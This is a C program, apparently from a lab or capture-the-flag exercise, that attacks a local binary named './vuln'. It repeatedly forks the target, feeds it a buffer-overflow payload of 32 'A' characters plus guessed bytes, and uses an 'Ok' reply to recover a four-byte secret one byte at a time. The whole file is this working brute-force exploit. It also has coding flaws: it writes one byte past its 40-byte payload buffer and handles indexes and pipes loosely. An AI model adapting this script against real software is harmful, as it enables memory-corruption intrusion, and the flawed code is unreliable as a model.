#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>
#include <time.h>
#include <string.h>

int main (int argc, char* argv[])
{
	int fdin[2];
	int fdout[2];
	time_t start_time = time(NULL);


	int next_debug_msg = 10;
	long  exec_count = 0;
	char ans[6];
	for (int i = 0; i < 4; i++) {
		for (int j = 0; j <= 255; j++) {
		
			
			if (pipe(fdin) < 0) {
				fprintf(stderr, "Pipe Failed\n");
				exit(1);
			}
			if (pipe(fdout) < 0) {
				fprintf(stderr, "Pipe Failed\n");
				exit(1);
			}

			exec_count++;
			pid_t pid = fork();
			if (pid < 0) {
				perror("main: fork");
				exit(1);
			}

			if (!pid) {
				//	CHILD
				close(fdin[1]);
				close(fdout[0]);

				dup2(fdout[1], 1);
				dup2(fdin[0], 0);
				char *argv[] = {"./vuln", NULL};
				execv(argv[0], argv);
				close(fdin[0]);
				close(fdout[1]);
				
			}
			else {
				// PARENT
				
				close(fdin[0]);
				close(fdout[1]);
				int byte = 3 + i;
				
				char exploit[40] = "33\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0";
				exploit[1] = byte + '0';
				ans[i] = j;
				ans[i+1] = '\n';
				ans[i+2] = '\0';

				strcat(exploit, ans);
				printf("exploit = %s\n", exploit);
				write(fdin[1], exploit, sizeof(exploit)+1);

				
			    wait(NULL);	
				
				char buffer[100];
				char buffer2[50];
				char buffer3[256];
				
			
				
				int nread1 = read(fdout[0], buffer, 47);
				if (nread1 != 47) {
					fprintf(stderr, "SEG fault\n");
					exit(11);
				}
				else 
					buffer[nread1] = '\0';
				int nread2 = read(fdout[0], buffer2, 9); 
				if (nread2 != 9) {
					fprintf(stderr, "SEG fault\n");
					exit(11);
				}
				else 
					buffer2[nread2] = '\0';
				
				int nread3 = read(fdout[0], buffer3, sizeof(buffer3));
				if (nread3 > 0)
					buffer3[nread3] = '\0';

				if (buffer3[0] == 'O' && buffer3[1] == 'k') {
					printf("\nProcess: (%d), stdout1: %s\n", pid, buffer);
					break;
				}
				
				close(fdout[0]);
			
			}
		}
		printf("\n%s\n", ans);
	}


	return 0;


}
